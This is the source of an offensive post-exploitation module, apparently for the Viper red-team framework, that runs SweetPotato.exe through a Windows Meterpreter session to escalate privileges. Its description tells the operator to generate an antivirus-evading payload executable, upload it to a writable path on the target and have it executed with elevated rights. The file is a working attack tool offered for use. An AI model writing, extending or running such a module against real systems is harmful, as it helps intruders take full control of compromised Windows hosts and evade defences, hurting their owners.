# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFCSharpModule):
    NAME_ZH = "SweetPotato提权"
    DESC_ZH = "模块使用SweetPotato.exe进行提权.\n" \
              "SweetPotato要求有本地服务权限,如IIS的Network Service\n" \
              "一般使用<监听载荷>生成免杀的exe文件,上传到目标可写路径,然后将exe文件路径输入到参数中"

    NAME_EN = "SweetPotato privilege escalation"
    DESC_EN = "The module uses SweetPotato.exe for privilege escalation.\n" \
              "SweetPotato requires local service permissions, such as IIS Network Service\n" \
              "Generally use <PayloadHandler> to generate an anti-virus exe file, upload it to the target writable path, and then enter the exe file path into the parameter"

    MODULETYPE = TAG2TYPE.Privilege_Escalation
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", ]  # 所需权限
    ATTCK = ["T1003"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/bgbezf"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1003/", "https://github.com/CCob/SweetPotato"]
    AUTHOR = ["Viper"]
    OPTIONS = register_options([
        OptionStr(name='prog',
                  tag_zh="执行的exe文件路径", desc_zh="输入需要执行的exe文件路径",
                  tag_en="Exe file path to be executed", desc_en="Enter the path of the exe file to be executed",
                  required=True, ),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        self.set_assembly("SweetPotato")
        self.set_execute_wait(3)
        self.set_arguments(f"-p {self.param('prog')}")
        return True, None

    def callback(self, status, message, data):
        assembly_out = self.get_console_output(status, message, data)
        self.log_raw(assembly_out)
